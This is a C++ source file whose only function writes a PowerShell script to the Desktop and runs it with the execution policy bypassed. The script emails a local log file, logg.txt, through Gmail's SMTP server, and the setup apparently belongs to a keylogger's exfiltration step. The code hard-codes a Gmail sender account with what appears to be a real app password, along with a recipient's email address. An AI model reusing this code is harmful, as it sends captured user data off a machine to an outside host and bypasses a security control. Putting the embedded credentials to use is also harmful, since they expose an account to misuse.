#include <iostream>
#include <fstream>

void send_mail() {
    std::cout << "sending email..." << std::endl;

    std::string tmp_path = "C:\\Users\\hleatherwood_2023\\Desktop\\tmp.ps1";
    std::ofstream tmp;
    tmp.open(tmp_path);

    std::string to = "hleatherwood_2023@depauw.edu";
    std::string from = "JohnDoeTestLog@gmail.com";
    std::string subject = "I apologize for partying too hard at your daughter's funeral";
    std::string username = "JohnDoeTestLog@gmail.com";
    std::string password = "rihqbkdkqymdvxrb";
    std::string server = "smtp.gmail.com";
    std::string port = "587";
    std::string msg = "this is a test msg";
    std::string msg_att_path = "C:\\Users\\hleatherwood_2023\\Desktop\\proj\\logg.txt";

    std::string ps_cmd = "$Username = \"" + from + "\"\n";
    ps_cmd += "$Password = \"" + password + "\"\n";
    ps_cmd += "$To = \"" + to + "\"\n";
    ps_cmd += "$Subject = \"" + subject + "\"\n";
    ps_cmd += "$Body = \"" + msg + "\"\n";
    ps_cmd += "$SMTPServer = \"" + server + "\"\n";
    ps_cmd += "$SMTPPort = \"" + port + "\"\n";
    ps_cmd += "$filenameAndPath = \"" + msg_att_path + "\"\n";
    ps_cmd += "$SMTPMessage = New-Object System.Net.Mail.MailMessage($Username, $To, $Subject, $Body)\n";
    ps_cmd += "$SMTPMessage.Attachments.Add($(New-Object System.Net.Mail.Attachment($filenameAndPath)))\n";
    ps_cmd += "$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)\n";
    ps_cmd += "$SMTPClient.EnableSsl = $true\n";
    ps_cmd += "$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)\n";
    ps_cmd += "$SMTPClient.Send($SMTPMessage)\n";

    tmp << ps_cmd;
    tmp.close();

    std::string exec_cmd = "powershell -ExecutionPolicy Bypass -F " + tmp_path;
    std::cout << exec_cmd << std::endl;
    system(exec_cmd.c_str());
    // remove(tmp_path.c_str());
}

int main() {
    send_mail();
    return 0;
}